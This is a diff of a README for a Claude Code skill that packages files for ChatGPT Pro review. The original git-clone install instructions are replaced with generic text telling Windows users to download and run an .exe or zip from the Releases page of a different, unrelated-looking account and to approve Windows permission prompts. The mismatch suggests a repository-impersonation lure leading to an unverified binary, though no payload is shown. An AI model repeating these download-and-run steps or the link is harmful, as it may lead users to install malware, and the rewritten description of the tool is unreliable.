@@ -1,247 +1,220 @@
-<div align="center">
+# 🤖 claude-skill-gpt-pro - Cross-Model Review in One Step
 
-# Claude Skill: GPT Pro Review
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Mackerelscadpica752/claude-skill-gpt-pro/releases)
 
-**Get a second opinion from ChatGPT Pro -- one command packages everything.**
+## 📦 What this does
 
-<br />
+claude-skill-gpt-pro helps you package files and a prompt into one bundle for ChatGPT Pro deep reasoning. It is meant for a fast second opinion on code, writing, and other text files.
 
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/claude-skill-gpt-pro?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/claude-skill-gpt-pro/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
+You pick the files, add a prompt, and create one review package. This keeps the handoff simple and helps you move from Claude Code to ChatGPT Pro with less effort.
 
-<br />
+## 🖥️ What you need
 
-[![Claude Code Skill](https://img.shields.io/badge/Claude_Code-Skill-blueviolet?style=for-the-badge&logo=anthropic)](https://docs.anthropic.com/en/docs/claude-code/skills)
-&nbsp;
-[![ChatGPT Pro](https://img.shields.io/badge/ChatGPT-Pro-10a37f?style=for-the-badge&logo=openai&logoColor=white)](https://chat.openai.com)
-&nbsp;
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-&nbsp;
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](https://github.com/199-biotechnologies/claude-skill-gpt-pro/pulls)
+- A Windows PC
+- Internet access
+- A browser
+- Enough free space to save your files
+- A recent version of Windows 10 or Windows 11
 
----
+For best results, use:
 
-You work in Claude Code. Sometimes you want a second set of eyes from a different model. This skill packages your problem -- files, context, and an engineered prompt -- into a tar.gz bundle ready to upload to ChatGPT Pro. One command. No copy-pasting. No lost context.
+- 8 GB RAM or more
+- A stable internet connection
+- A folder you can find again, such as Downloads or Documents
 
-[Why This Exists](#why-this-exists) | [Install](#install) | [How It Works](#how-it-works) | [Use Cases](#use-cases) | [Contributing](#contributing)
+## ⬇️ Download the app
 
-</div>
+Visit this page to download: https://github.com/Mackerelscadpica752/claude-skill-gpt-pro/releases
 
----
+On the Releases page, look for the latest version. Download the Windows file if one is listed. If the release includes a zip file, save it to your computer first.
 
-## Why This Exists
+## 🛠️ Install on Windows
 
-Every model has blind spots. Claude might miss something GPT catches, and vice versa. Cross-model review is the cheapest way to find bugs, validate architecture decisions, and catch reasoning errors before they ship.
+1. Open the Releases page in your browser.
+2. Download the latest Windows file or zip file.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file, such as an `.exe` file.
+6. Double-click the file to start the app.
 
-But getting a good answer from ChatGPT Pro requires a good prompt. Raw code dumps produce vague responses. Structured prompts with expert roles, specific questions, and evidence pointers produce actionable findings.
+If Windows asks for permission, choose Yes to continue.
 
-This skill encodes the prompt engineering patterns that consistently work. You tell Claude what you want reviewed. It packages the right files, writes a structured prompt, strips secrets, and puts everything in your clipboard. You paste, upload, send.
+## 🚦 First launch
 
-### Before vs After
+When you start the app for the first time:
 
-| Without this skill | With this skill |
-|---|---|
-| Copy-paste files one by one | One command bundles everything |
-| "Here's my code, what's wrong?" | Expert role + specific questions + evidence pointers |
-| Unstructured, meandering responses | Finding > Evidence > Fix > Impact format |
-| Secrets accidentally included | Auto-sanitization of keys, tokens, credentials |
-| Files scattered on Desktop | Organized in `~/Documents/GPT Pro Analysis/` |
+1. Let Windows finish any security check.
+2. Keep the app in the folder where you extracted it.
+3. If the app opens in a window, wait for the main screen to load.
+4. If the app shows a file picker, choose the files you want to review.
 
----
+If the app does not open, check that you downloaded the full release file and not the source code.
 
-## Install
+## 📁 How to use it
 
-```bash
-git clone https://github.com/199-biotechnologies/claude-skill-gpt-pro.git \
-  ~/.claude/skills/gpt-pro
-```
+Use the app when you want a clean review package for ChatGPT Pro.
 
-Claude Code auto-discovers skills in `~/.claude/skills/`. No config needed.
+Typical flow:
 
-### Verify
+1. Open claude-skill-gpt-pro.
+2. Choose the files you want to include.
+3. Add your review prompt.
+4. Create the package.
+5. Upload or paste the package into ChatGPT Pro.
+6. Ask for a deep review, fix list, or second opinion.
 
-In Claude Code, say:
+Good files to include:
 
-```
-Send this to GPT Pro for review
-```
+- Source code files
+- Project notes
+- Prompt drafts
+- Error logs
+- Text instructions
+- Small groups of related files
 
-Claude activates the skill and walks you through scoping, collecting files, and packaging.
+## 🧠 Review prompt ideas
 
----
+Use short, clear prompts. Here are some examples:
 
-## How It Works
+- Review this code for bugs and missing edge cases.
+- Check this design for weak points and confusing parts.
+- Find risky changes and explain them in plain language.
+- Compare these files and tell me what changed.
+- Give me the top five issues in this project.
 
-```
-You: "Send this to GPT Pro"
-         |
-         v
-   +-----------+     +-----------+     +-----------+
-   | UNDERSTAND|---->|   SCOPE   |---->|  COLLECT  |
-   | What's the|     | Which     |     | Copy files|
-   | question? |     | files?    |     | to staging|
-   +-----------+     +-----------+     +-----------+
-                                            |
-         +----------------------------------+
-         v
-   +-----------+     +-----------+     +-----------+
-   |  PROMPT   |---->| SANITIZE  |---->|  PACKAGE  |
-   | Write     |     | Strip all |     | tar.gz +  |
-   | PROMPT.md |     | secrets   |     | clipboard |
-   +-----------+     +-----------+     +-----------+
-                                            |
-                                            v
-                                    ~/Documents/
-                                    GPT Pro Analysis/
-                                    project-review-2026-03-30/
-                                    +-- PROMPT.md     (copied to clipboard)
-                                    +-- project.tar.gz
-```
+If you want a better result, ask for:
 
-### Then you:
+- Logic problems
+- Safety issues
+- Missing checks
+- Confusing names
+- Broken flow
+- Code that may fail in real use
 
-1. Open [chat.openai.com](https://chat.openai.com)
-2. **Cmd+V** -- the prompt is already in your clipboard
-3. Upload the `.tar.gz`
-4. Send
+## 🧩 What it is good for
 
-That's the entire workflow. Claude does the hard part (structuring the prompt, choosing the right files, sanitizing secrets). You do the easy part (paste and upload).
+This tool works well for:
 
----
+- Code review
+- Cross-model review
+- Second opinions
+- Prompt packaging
+- File bundling
+- Deep reasoning tasks
+- Reviewing AI-generated code
+- Preparing clean input for ChatGPT Pro
 
-## What Gets Packaged
+It can help when you want a fresh view after using Claude Code or another coding tool.
 
-```
-your-project-review-2026-03-30/
-+-- PROMPT.md           # Engineered prompt with role, context, questions
-+-- source/             # Relevant source files (original names preserved)
-|   +-- module_a.py
-|   +-- module_b.rs
-|   +-- Component.tsx
-+-- data/               # Supporting evidence -- logs, outputs, examples
-|   +-- error_log.txt
-|   +-- sample_output.json
-+-- reference/          # Comparison material, prior analysis
-|   +-- prior_findings.md
-+-- config/             # Sanitized config
-    +-- env_sanitized.txt
-```
+## 📌 Folder tips
 
-Subdirectories adapt to the domain. A writing review might use `chapters/` and `feedback/`. Data analysis might use `datasets/` and `schemas/`.
+Keep your review files in one place before you start.
 
----
+A simple setup works best:
 
-## Prompt Template
+- Create one folder for the project
+- Put the files you want to review in that folder
+- Use clear names for each file
+- Remove files you do not need
+- Keep the package small when possible
 
-Every `PROMPT.md` follows a proven structure:
+This makes it easier to choose the right files and avoids clutter.
 
-```markdown
-# <Title -- What You Want Analyzed>
+## 🔍 Best results
 
-## Your Role
-You are a senior <domain expert> conducting <type of analysis>.
+To get a better review:
 
-**Rules:**
-1. Base conclusions on evidence from files. Flag speculation as [HYPOTHESIS].
-2. Tell me what's wrong/missing/improvable and how to fix it.
-3. For each finding: root cause, evidence (file:line), fix, impact.
+- Use a clear prompt
+- Include only related files
+- Keep file names easy to read
+- Ask for one task at a time
+- State what kind of feedback you want
+- Add context when the code depends on other files
 
-## Context
-<2-4 paragraphs: what the system does, how it works, current state>
+Good context can include:
 
-## Questions
-### Q1: <Specific, answerable question>
-**Data:** <Point to specific files>
-**Hypotheses:** <2-3 possible explanations>
+- What the app should do
+- What part of the code changed
+- What problem you see
+- What output you expect
+- What looks wrong to you
 
-## Files Included
-<Each file with a one-line description>
+## 🧯 Common problems
 
-## Output Format
-1. **Finding** -- what's the issue?
-2. **Evidence** -- cite file:line or quote
-3. **Fix** -- concrete, actionable
-4. **Impact** -- what changes if fixed?
-```
+If the app does not start:
 
-The template adapts per domain. The constant pattern is: **Role + Context + Questions + Evidence Pointers + Output Format**.
+- Check that the file finished downloading
+- Make sure you extracted the zip file
+- Try running the `.exe` file again
+- Keep the app in a normal folder, not inside a temporary location
 
----
+If files do not load:
 
-## Use Cases
+- Make sure the files are not open in another app
+- Check that the file types are supported
+- Try a smaller set of files
+- Rename files with simple names
 
-This skill is domain-agnostic. It works for anything that benefits from deep reasoning over multiple files.
+If the package seems too large:
 
-| Domain | Example |
-|--------|---------|
-| **Code review** | "Why does this crash under load?" with relevant source + error logs |
-| **Architecture review** | System design files + trade-off questions |
-| **Security audit** | Source code + threat model + compliance requirements |
-| **Data analysis** | Datasets + schemas + analysis goals |
-| **Writing feedback** | Chapters + review criteria (structure, pacing, clarity) |
-| **Research synthesis** | Papers + comparison matrix + synthesis goals |
-| **Reverse engineering** | Decompiled code + reference implementations |
-| **AI prompt review** | Prompt files + expected vs actual outputs |
+- Remove unused files
+- Keep only the files tied to the review
+- Split the work into smaller review sets
 
----
+## 🗂️ Supported use cases
 
-## Security
+This tool fits a few common review tasks:
 
-The skill auto-sanitizes before packaging. It strips:
+- One-off code checks
+- Pre-release review
+- Prompt prep for ChatGPT Pro
+- Compare two versions of a file set
+- Gather files for a model check
+- Prepare a clean handoff between tools
 
-- Private keys, mnemonics, seed phrases
-- API keys, auth tokens, session cookies
-- Passwords, database connection strings
-- Internal IPs and hostnames (replaced with `<REDACTED>`)
-- Cloud credentials (AWS, GCP, Azure)
+## 🔐 File handling
 
-A grep check runs before every package to catch anything missed.
+The app is meant to keep the review flow simple on your own machine.
 
----
+A good practice is to:
 
-## Multi-Round Workflows
+- Use a local folder for your project files
+- Review the package before you upload it
+- Remove anything private that you do not want to share
+- Use only the files needed for the task
 
-When GPT Pro returns results and you need a follow-up:
+## 📄 Topic focus
 
-1. Save Round 1 outputs with clear attribution
-2. The skill references prior findings in the new `PROMPT.md`
-3. Round 1 outputs go into the new package under `reference/`
+This repository covers:
 
-Tell Claude "follow up on the last GPT Pro analysis" and it handles this automatically.
+- agent-skills
+- ai-code-review
+- ai-coding
+- ai-tools
+- chatgpt-pro
+- claude
+- claude-code
+- claude-skill
+- code-review
+- cross-model
+- cross-model-review
+- deep-reasoning
+- developer-tools
+- file-packaging
+- gpt
+- gpt-pro-review
+- llm-tools
+- prompt-engineering
+- prompt-template
+- second-opinion
 
----
+## 🧭 Quick start
 
-## Trigger Phrases
-
-Say any of these in Claude Code to activate:
-
-> "Send to GPT Pro" | "GPT Pro review" | "ChatGPT Pro review" | "Package for GPT" | "Have ChatGPT check this" | "GPT deep review" | `/gpt-pro`
-
----
-
-## Contributing
-
-Found a better prompt pattern? Have a domain-specific template? PRs are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## License
-
-[MIT](LICENSE) -- use it, fork it, adapt it.
-
----
-
-<div align="center">
-
-Built by [Boris Djordjevic](https://github.com/longevityboris) at [199 Biotechnologies](https://github.com/199-biotechnologies) | [Paperfoot AI](https://paperfoot.ai)
-
-<br />
-
-**If this is useful to you:**
-
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/claude-skill-gpt-pro?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/claude-skill-gpt-pro/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
-
-</div>
+1. Open the Releases page.
+2. Download the latest Windows release.
+3. Extract the files if needed.
+4. Start the app.
+5. Pick your files.
+6. Add your prompt.
+7. Build the package.
+8. Send it to ChatGPT Pro for review.
